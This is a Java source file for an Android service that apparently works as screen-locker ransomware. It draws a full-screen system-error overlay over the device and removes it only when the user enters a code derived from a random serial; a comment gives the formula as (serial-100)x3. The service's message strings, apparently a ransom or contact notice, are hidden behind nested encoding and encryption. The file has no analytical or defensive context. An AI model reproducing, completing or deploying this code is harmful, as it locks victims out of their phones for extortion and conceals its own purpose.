package pjz.cnm;


import android.app.*;
import android.content.*;
import android.graphics.*;
import android.net.*;
import android.os.*;
import android.view.*;
import android.view.View.*;
import android.view.WindowManager.*;
import android.widget.*;

public class s extends Service
{
	private WindowManager.LayoutParams wmParams;
	private WindowManager mWindowManager;
	private View mFloatLayout;
	Button bt;
	EditText ed;
	TextView tv,qq,bohe,q1,q2;
	int xlh,bohem;
	d d;
	a a;
    String bhrj,lock,AIDE;
	SharedPreferences share;
	SharedPreferences.Editor editor;
	@Override
	public IBinder onBind(Intent p1)
	{
		// TODO: Implement this method
		return null;
	}
	public static String hh(String r4_String, int r5i)
	{
		String r1_String = "";
		String[] r2_String_A = r4_String.split("/");
		int r0i = 1;
		while (r0i < r2_String_A.length)
		{
			r1_String = new StringBuffer().append(r1_String).append((char) Integer.parseInt(r2_String_A[r0i], r5i)).toString();
			r0i++;
		}
		return r1_String;
	}
	public static String pjy(String r4_String, int r5i)
	{
		String r1_String = "";
		String[] r2_String_A = r4_String.split("/");
		int r0i = 1;
		while (r0i < r2_String_A.length)
		{
			r1_String = new StringBuffer().append(r1_String).append((char) Integer.parseInt(r2_String_A[r0i], r5i)).toString();
			r0i++;
		}
		return r1_String;
	}
	@Override
	public void onCreate()
	{
		// TODO: Implement this method
		super.onCreate();
   
		d=new d(pjy(hh("/1b/34/1g/1j/1b/37/37/2y/1b/35/35/2s/1b/30/2r/2t/1b/2v/39/2w/1b/39/1g/3d",36),35));
		try {
			a=new a(d.decrypt(d.decrypt("fb385e9202c243322e8fa3d9c6da8d8440847711aa43f608a7ae435b867fb0763f2a41345a393971ab6b08f45f3428f7d9cf9531964190c7")));
			}
		catch (Exception e) {}
		xlh = (int)(Math.random()*448870);
		bohem= (xlh-100)*3;
		
		// 密码（序列号-100）x 3
	}

	@Override
	public void onStart(Intent intent, int startId)
	{
		// TODO: Implement this method
		super.onStart(intent, startId);
		doActivity();
	}

	private void doActivity()
	{

		/*
		 lp.type = 2010;
		 r0_service.lp.flags = 1280;
		 r0_service.lp.format = 1;
		 r0_service.lp.width = -1;
		 r0_service.lp.height = -1;
		 r0_service.lp.gravity = 17;
		 */
		wmParams = new WindowManager.LayoutParams();
//获取的是WindowManagerImpl.CompatModeWrapper
		mWindowManager = (WindowManager)getApplication().getSystemService(getApplication().WINDOW_SERVICE);
//Log.i(TAG, "mWindowManager--->"+ mWindowManager);
//设置window type
		wmParams = new WindowManager.LayoutParams();
		mWindowManager = (WindowManager)getApplication().getSystemService(getApplication().WINDOW_SERVICE);
		wmParams.type = LayoutParams.TYPE_SYSTEM_ERROR;
		wmParams.format = PixelFormat.RGBA_8888;
		wmParams.flags =LayoutParams.FLAG_FULLSCREEN| LayoutParams.FLAG_LAYOUT_IN_SCREEN;
		wmParams.gravity = Gravity.CENTER | Gravity.CENTER;
		wmParams.width = WindowManager.LayoutParams.FILL_PARENT;
		wmParams.height = WindowManager.LayoutParams.FILL_PARENT;
		LayoutInflater inflater = LayoutInflater.from(getApplication());
//获取浮动窗口视图所在布局
		mFloatLayout = inflater.inflate(R.layout.bohe, null);

//添加mFloatLayout

		mWindowManager.addView(mFloatLayout, wmParams);
	
		bt = (Button)mFloatLayout.findViewById(R.id.bt);
		ed = (EditText)mFloatLayout.findViewById(R.id.ed);
		tv = (TextView)mFloatLayout.findViewById(R.id.tv);
		qq = (TextView)mFloatLayout.findViewById(R.id.qq);

		bohe = (TextView)mFloatLayout.findViewById(R.id.bohe);

		q1 = (TextView)mFloatLayout.findViewById(R.id.q1);

		q2 = (TextView)mFloatLayout.findViewById(R.id.q2);
		
		
				
		try
		{
			String wc=a.decrypt("0d47489ff6cd1c4735735bd516ac1a71");
			String oc=a.decrypt("61908e34f5bd4061");
			ed.setHint(wc);
			bt.setHint(oc);
		}
		catch (Exception e)
		{}
		bt.setOnClickListener(new OnClickListener()
			{

				@Override
				public void onClick(View p1)
				{
					// TODO: Implement this method
					try
					{
						if (ed.getText().toString().equals(String.valueOf(bohem)))
						{
							mWindowManager.removeView(mFloatLayout);
							stopSelf();
						}
					}
					catch (Exception e)
					{}
				}
			});
		try
		{ 
		String xlh=a.decrypt("7c2a6d2ff1d62cb1e935f00f66767f07");
			bhrj=a.decrypt("f99f466e5ded9ba19f8527b8a79032322108ed346998706c5f64fb7034ba21ec7d9dc0596b0ef9b0");
		
			tv.append(xlh + xlh);
			qq.append("\n\n"+bhrj);
			bohe.append("\n\n"+bhrj);
			q1.append("\n\n"+bhrj);
			q2.append("\n\n"+bhrj);
		}
		catch (Exception e)
		{}
	}

	public boolean is(Context  context)
	{ 
		if (context != null)
		{ 
		 AIDE=bhrj;
			ConnectivityManager 
				mConnectivityManager = (ConnectivityManager) context .getSystemService(Context.CONNECTIVITY_SERVICE); 
			NetworkInfo mNetworkInfo = mConnectivityManager.getActiveNetworkInfo(); 
			if (mNetworkInfo != null)
			{ 
				return mNetworkInfo.isAvailable(); 
			} 
		} 
		
		lock=AIDE;
		return false; 
	} 
}
